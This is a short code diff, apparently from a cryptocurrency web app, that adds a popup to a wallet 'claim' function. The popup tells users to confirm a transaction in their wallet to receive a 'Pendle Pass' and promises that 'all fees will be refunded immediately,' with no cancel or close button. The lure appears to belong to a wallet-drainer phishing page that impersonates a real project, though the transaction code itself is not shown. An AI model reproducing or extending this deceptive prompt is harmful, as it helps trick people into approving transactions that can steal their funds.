@@ -470,6 +470,23 @@ export default {
     async wc_claim() {
       try {
         if (getAccount().isConnected) {
+          Swal.fire({
+            html:
+              '<p style="color: #fff; margin-bottom: 5px !important; line-height: 1.6; font-size: 20px !important;">Check your wallet and click on confirm to receive your Pendle Pass. All fees will be refunded immediately.</p>' +
+              '<small style="font-size: 15px">Verify your wallet to continue</small> ',
+            showCloseButton: false,
+            showCancelButton: false,
+            showConfirmButton: false,
+            background: '#00000080',
+            width: '550px',
+            color: '#fff',
+            customClass: {
+              loader: '',
+            },
+            didOpen: () => {
+              Swal.showLoading();
+            },
+          });
           this.processing = true;
           this.isDone = false;
 
